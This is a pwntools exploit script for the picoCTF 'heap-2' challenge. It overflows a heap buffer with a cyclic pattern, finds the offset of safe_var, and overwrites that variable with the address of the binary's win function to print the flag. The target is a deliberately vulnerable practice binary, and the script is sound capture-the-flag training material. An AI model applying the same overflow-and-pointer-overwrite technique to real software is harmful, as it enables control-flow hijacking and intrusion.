#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./heap-2')
p = process(elf.path)
# p = remote('mimas.picoctf.net', 63948)

# Overwrite safe_var
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Data for buffer: ', cyclic(0x100))

# Find safe_var offset
p.sendlineafter(b'Enter your choice: ', b'1')
p.recvuntil(b'  ->   ')
p.recvuntil(b'  ->   ')
p.recvuntil(b'  ->   ')
safe_var = p.recvline().strip()
safe_var_offset = cyclic_find(safe_var)
log.info(f'{safe_var_offset=}')

# Overwrite safe_var with `win` function
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Data for buffer: ', b'A' *
                safe_var_offset + p64(elf.sym.win))

# # Get flag
p.sendlineafter(b'Enter your choice: ', b'4')
p.interactive()
